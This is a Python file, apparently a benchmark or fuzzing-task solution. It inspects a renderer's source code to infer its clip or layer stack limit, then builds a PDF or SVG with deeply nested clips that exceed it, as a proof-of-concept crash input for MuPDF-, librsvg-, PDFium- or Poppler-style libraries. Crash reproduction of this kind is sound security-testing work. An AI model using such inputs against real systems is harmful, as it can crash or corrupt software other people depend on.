import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        names_lower: List[str] = []
        files_hint: List[Tuple[str, bytes]] = []

        def add_hint(name: str, data: bytes):
            if len(files_hint) < 200:
                files_hint.append((name, data))

        def scan_dir(root: str):
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    p = os.path.join(dirpath, fn)
                    rel = os.path.relpath(p, root).replace(os.sep, "/")
                    nlow = rel.lower()
                    names_lower.append(nlow)
                    if nlow.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".m", ".mm", ".rs", ".py", ".sh", ".txt", ".md")):
                        if any(k in nlow for k in ("draw", "device", "clip", "layer", "stack", "fitz", "mupdf", "pdf", "svg", "rsvg", "fuzz")):
                            try:
                                with open(p, "rb") as f:
                                    add_hint(nlow, f.read(512 * 1024))
                            except OSError:
                                pass

        def scan_tar(tarpath: str):
            with tarfile.open(tarpath, "r:*") as tf:
                members = tf.getmembers()
                for m in members:
                    if not m.isfile():
                        continue
                    nlow = m.name.lower()
                    names_lower.append(nlow)
                for m in members:
                    if not m.isfile():
                        continue
                    nlow = m.name.lower()
                    if not nlow.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".m", ".mm", ".rs", ".py", ".sh", ".txt", ".md")):
                        continue
                    if not any(k in nlow for k in ("draw", "device", "clip", "layer", "stack", "fitz", "mupdf", "pdf", "svg", "rsvg", "fuzz")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        add_hint(nlow, f.read(512 * 1024))
                    except Exception:
                        continue

        if os.path.isdir(src_path):
            scan_dir(src_path)
        else:
            scan_tar(src_path)

        def detect_project(names: List[str], hints: List[Tuple[str, bytes]]) -> str:
            joined = "\n".join(names[:2000])
            if any("mupdf" in n for n in names) or any("/fitz/" in n for n in names) or any("/include/mupdf/" in n for n in names):
                return "mupdf"
            if any("librsvg" in n for n in names) or any("/rsvg" in n for n in names) or any("rsvg.h" in n for n in names):
                return "librsvg"
            if any("pdfium" in n for n in names) or any("/fpdf" in n for n in names) or any("/core/fpdfapi" in n for n in names):
                return "pdfium"
            if any("poppler" in n for n in names):
                return "poppler"
            if any("mupdf" in joined for _ in [0]):
                return "mupdf"
            # look in hint file contents
            for nlow, data in hints:
                s = data
                if b"fz_context" in s or b"fz_document" in s or b"pdf_document" in s or b"fitz" in s:
                    return "mupdf"
                if b"RsvgHandle" in s or b"rsvg_handle" in s or b"librsvg" in s:
                    return "librsvg"
                if b"PDFium" in s or b"FPDF" in s or b"CPDF_" in s:
                    return "pdfium"
                if b"poppler" in s or b"GfxState" in s:
                    return "poppler"
            return "unknown"

        project = detect_project(names_lower, files_hint)

        def infer_stack_limit(hints: List[Tuple[str, bytes]]) -> Optional[int]:
            best = None  # (score, value)
            patterns = [
                re.compile(rb"#\s*define\s+([A-Z0-9_]*(?:LAYER|CLIP)[A-Z0-9_]*STACK[A-Z0-9_]*)\s+(\d+)", re.I),
                re.compile(rb"#\s*define\s+([A-Z0-9_]*STACK(?:_SIZE|_LEN|_DEPTH|_MAX)?[A-Z0-9_]*)\s+(\d+)", re.I),
                re.compile(rb"\benum\s*\{[^}]*\b([A-Z0-9_]*STACK(?:_SIZE|_LEN|_DEPTH|_MAX)?[A-Z0-9_]*)\s*=\s*(\d+)", re.I | re.S),
                re.compile(rb"\b(?:MAX|LIMIT|SIZE)\s*=\s*(\d+)\b", re.I),
            ]

            def consider(name: str, val: int, base_score: int):
                nonlocal best
                if val < 8 or val > 200000:
                    return
                score = base_score
                u = name.upper()
                if "CLIP" in u:
                    score += 6
                if "LAYER" in u:
                    score += 4
                if "NEST" in u or "DEPTH" in u:
                    score += 2
                if "STACK" in u:
                    score += 2
                if "draw" in name.lower() or "device" in name.lower():
                    score += 2
                # favor values in common ranges
                if 32 <= val <= 32768:
                    score += 2
                if best is None or score > best[0] or (score == best[0] and val < best[1]):
                    best = (score, val)

            for fname, data in hints:
                lo = fname.lower()
                content = data
                local_bonus = 0
                if b"layer/clip" in content.lower() or b"layer" in content.lower() and b"clip" in content.lower() and b"stack" in content.lower():
                    local_bonus += 3
                if b"clip mark" in content.lower():
                    local_bonus += 3
                if "draw" in lo or "device" in lo:
                    local_bonus += 2
                for pat in patterns[:3]:
                    for m in pat.finditer(content):
                        macro = m.group(1)
                        val = int(m.group(2))
                        consider(macro.decode("latin1", "ignore"), val, 10 + local_bonus)
                # Also try to find direct numeric array sizes near stack usage
                if (b"stack" in content.lower() and b"clip" in content.lower()) or (b"layer" in content.lower() and b"clip" in content.lower()):
                    for m in re.finditer(rb"\bstack\s*\[\s*(\d+)\s*\]", content, flags=re.I):
                        val = int(m.group(1))
                        consider("stack[]", val, 8 + local_bonus)
                    for m in re.finditer(rb"\bclip\s*stack\s*\[\s*(\d+)\s*\]", content, flags=re.I):
                        val = int(m.group(1))
                        consider("clip stack[]", val, 9 + local_bonus)
            return best[1] if best else None

        limit = infer_stack_limit(files_hint)

        def clamp_n(n: int) -> int:
            if n < 64:
                n = 64
            if n > 30000:
                n = 30000
            return n

        def build_pdf_nested_clips(n: int) -> bytes:
            n = clamp_n(n)
            # Ensure rectangles remain positive; start size is n + margin.
            start_size = n + 50
            mb = start_size + 100

            ops = []
            for i in range(n):
                w = start_size - i
                ops.append(f"q 0 0 {w} {w} re W n\n")
            ops.append("0 0 0 rg 0 0 1 1 re f\n")
            for _ in range(n):
                ops.append("Q\n")

            stream = "".join(ops).encode("ascii", "strict")

            header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"

            obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
            obj2 = b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n"
            obj3 = f"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 {mb} {mb}] /Contents 4 0 R /Resources <<>> >>\nendobj\n".encode(
                "ascii", "strict"
            )
            obj4 = b"4 0 obj\n<< /Length " + str(len(stream)).encode("ascii") + b" >>\nstream\n" + stream + b"endstream\nendobj\n"

            objects = [obj1, obj2, obj3, obj4]
            offsets = []
            cur = len(header)
            for ob in objects:
                offsets.append(cur)
                cur += len(ob)

            xref_offset = cur
            xref_lines = []
            xref_lines.append(b"xref\n")
            xref_lines.append(b"0 5\n")
            xref_lines.append(b"0000000000 65535 f \n")
            for off in offsets:
                xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
            xref = b"".join(xref_lines)

            trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"
            return header + b"".join(objects) + xref + trailer

        def build_svg_nested_clips(n: int) -> bytes:
            n = clamp_n(n)
            # SVG parser depth limits might exist; keep it reasonable if not inferred
            if n > 5000:
                n = 5000
            if n < 300:
                n = 300
            head = (
                '<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2">'
                '<defs><clipPath id="c"><rect x="0" y="0" width="2" height="2"/></clipPath></defs>'
            )
            open_g = '<g clip-path="url(#c)">'
            close_g = "</g>"
            body = open_g * n + '<rect x="0" y="0" width="2" height="2"/>' + close_g * n
            tail = "</svg>"
            return (head + body + tail).encode("utf-8", "strict")

        if project in ("librsvg",):
            n = (limit + 16) if limit else 600
            return build_svg_nested_clips(n)
        else:
            # Default to PDF-based trigger for renderers with layer/clip stacks (common on OSS-Fuzz).
            n = (limit + 64) if limit else 8000
            return build_pdf_nested_clips(n)